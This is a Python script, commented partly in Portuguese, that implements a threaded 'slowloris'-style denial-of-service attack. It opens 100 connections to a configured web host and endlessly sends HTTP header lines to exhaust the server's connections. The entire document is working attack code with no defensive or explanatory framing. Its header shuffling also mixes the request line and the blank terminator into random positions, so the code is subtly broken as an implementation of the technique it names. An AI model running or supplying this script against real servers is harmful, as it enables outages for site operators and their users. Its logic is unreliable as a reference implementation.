import socket
import threading
import time
import random
import logging

# Configurações
target_host = "example.com"
target_port = 80
num_threads = 100

# Configurar o logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

def slowloris():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target_host, target_port))
        logging.info(f"Conexão estabelecida com {target_host}:{target_port}")
        while True:
            # Randomize the headers
            headers = [
                "GET / HTTP/1.1\r\n",
                f"Host: {target_host}\r\n",
                f"User-Agent: Mozilla/5.0 (Windows NT {random.randint(5, 10)}.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36\r\n",
                "Accept: */*\r\n",
                "Accept-Encoding: gzip, deflate\r\n",
                f"Connection: keep-alive\r\n",
                "\r\n"
            ]
            random.shuffle(headers)
            for header in headers:
                s.send(header.encode('utf-8'))
            time.sleep(0.1)  # Ajuste o atraso conforme necessário
    except Exception as e:
        logging.error(f"Erro ao manter a conexão: {e}")
    finally:
        s.close()

def main():
    threads = []
    for i in range(num_threads):
        t = threading.Thread(target=slowloris)
        threads.append(t)
        t.start()
        logging.info(f"Thread {i+1} iniciada")

    for t in threads:
        t.join()

if __name__ == "__main__":
    main()
